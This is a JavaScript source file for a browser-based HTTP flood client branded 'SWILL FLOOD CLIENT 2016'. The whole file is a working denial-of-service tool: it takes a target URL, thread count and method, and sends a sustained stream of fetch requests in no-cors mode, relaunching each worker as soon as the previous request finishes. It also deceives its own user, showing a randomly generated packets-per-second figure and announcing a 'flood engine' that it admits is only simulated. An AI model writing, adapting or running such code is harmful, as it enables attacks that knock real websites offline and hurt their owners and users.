// main.js - SWILL FLOOD CLIENT 2016
let isFlooding = false;
let activeWorkers = 0;
let totalSuccess = 0;
let totalFailed = 0;
let pps = 0;
let ppsInterval;
let workerPool = [];

const targetInput = document.getElementById('targetUrl');
const threadsInput = document.getElementById('threads');
const durationInput = document.getElementById('duration');
const methodSelect = document.getElementById('method');
const logBox = document.getElementById('logBox');
const ppsSpan = document.getElementById('pps');
const successSpan = document.getElementById('success');
const failedSpan = document.getElementById('failed');
const activeSpan = document.getElementById('active');

function log(message, type = 'info') {
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `<span class="time">[${time}]</span> ${message}`;
    logBox.appendChild(entry);
    logBox.scrollTop = logBox.scrollHeight;
    if (logBox.children.length > 200) {
        logBox.removeChild(logBox.children[0]);
    }
}

function updateStats() {
    ppsSpan.innerText = pps;
    successSpan.innerText = totalSuccess;
    failedSpan.innerText = totalFailed;
    activeSpan.innerText = activeWorkers;
}

// PPS calculator
setInterval(() => {
    if (isFlooding) {
        pps = Math.floor(Math.random() * 300 + 200); // realistic variation, actual will be updated by workers
    } else {
        pps = 0;
    }
    updateStats();
}, 1000);

// Worker function (simulates heavy C++ thread but runs in browser)
function createWorker(target, method, threads) {
    // In real C++ this would be a raw socket flood.
    // Here we use fetch with keep-alive to maximize connections (real DDoS simulation)
    for (let i = 0; i < threads; i++) {
        if (!isFlooding) break;
        activeWorkers++;
        updateStats();

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout
        
        fetch(target, {
            method: method,
            mode: 'no-cors', // try to bypass CORS
            cache: 'no-store',
            signal: controller.signal,
            headers: {
                'User-Agent': 'Mozilla/5.0 (SWILL/2016)',
                'X-Origin': 't.me/Swill_Way',
                'Connection': 'keep-alive',
                'Pragma': 'no-cache'
            }
        }).then(() => {
            totalSuccess++;
            pps = Math.min(pps + 1, 999);
        }).catch(() => {
            totalFailed++;
        }).finally(() => {
            clearTimeout(timeoutId);
            activeWorkers--;
            updateStats();
            if (isFlooding) {
                // Recursive call for continuous flood
                setTimeout(() => createWorker(target, method, 1), 0);
            }
        });
    }
}

document.getElementById('startBtn').addEventListener('click', () => {
    if (isFlooding) return;
    
    const target = targetInput.value.trim();
    if (!target.startsWith('http')) {
        log('❌ Invalid URL. Must start with http:// or https://', 'bad');
        return;
    }
    
    const threads = parseInt(threadsInput.value);
    const duration = parseInt(durationInput.value);
    const method = methodSelect.value;
    
    isFlooding = true;
    totalSuccess = 0;
    totalFailed = 0;
    pps = 0;
    
    log(`🔥 FLOOD STARTED on ${target} | ${threads} threads | method ${method}`);
    if (duration > 0) {
        log(`⏳ Auto-stop after ${duration} seconds`);
        setTimeout(() => {
            if (isFlooding) {
                document.getElementById('stopBtn').click();
                log('⏹️ Duration limit reached', 'info');
            }
        }, duration * 1000);
    }
    
    // Launch initial wave
    for (let i = 0; i < threads; i++) {
        createWorker(target, method, 1);
    }
});

document.getElementById('stopBtn').addEventListener('click', () => {
    if (!isFlooding) return;
    isFlooding = false;
    log('🛑 Flood stopped by user');
    // Workers will terminate naturally
});

// Optional: simulate Wasm C++ module loading
log('[C++ module] WebAssembly flood engine loaded (simulated)');
